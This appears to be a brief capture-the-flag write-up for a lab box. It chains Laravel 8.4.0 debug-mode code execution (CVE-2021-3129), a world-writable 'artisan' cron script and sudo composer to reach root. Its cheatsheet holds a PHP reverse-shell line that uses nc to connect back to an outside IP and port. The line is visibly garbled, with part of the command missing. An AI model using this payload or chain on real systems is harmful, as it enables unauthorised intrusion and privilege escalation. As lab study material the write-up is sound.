## Report

Laravel 8.4.0 is vulnerable to RCE when the 'debug' feature is turned on. Monitoring processes via pspy we see a script running every minute as user 'splunk' called 'artisan' which is editable by 'www-data'. Add a reverse shell payload to become 'splunk'. We can run composer as sudo - GTFOBins to root

### Hint

Does working with such a mid box count as a hint cus my payload was on point if only the stupid thing would work via VPN

## Cheatsheet

{% code title="That PHP payload is deadly" %}
```
Turn DEBUG ON for exploit to work
busybox reverse shell
echo "<?php system('rm /tmp/f;mkfifo /tm&1|nc 192.168.49.51 8001>/tmp/f'); ?>" > artisan
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption><p>Toggling debug seems to change a value 'token'</p></figcaption></figure>

In requests with and without debugging, the token is sent but we don't see any difference

### Attack Vectors

{% embed url="https://github.com/joshuavanderpoll/CVE-2021-3129?source=post_page-----12bfd272e9cf---------------------------------------" %}
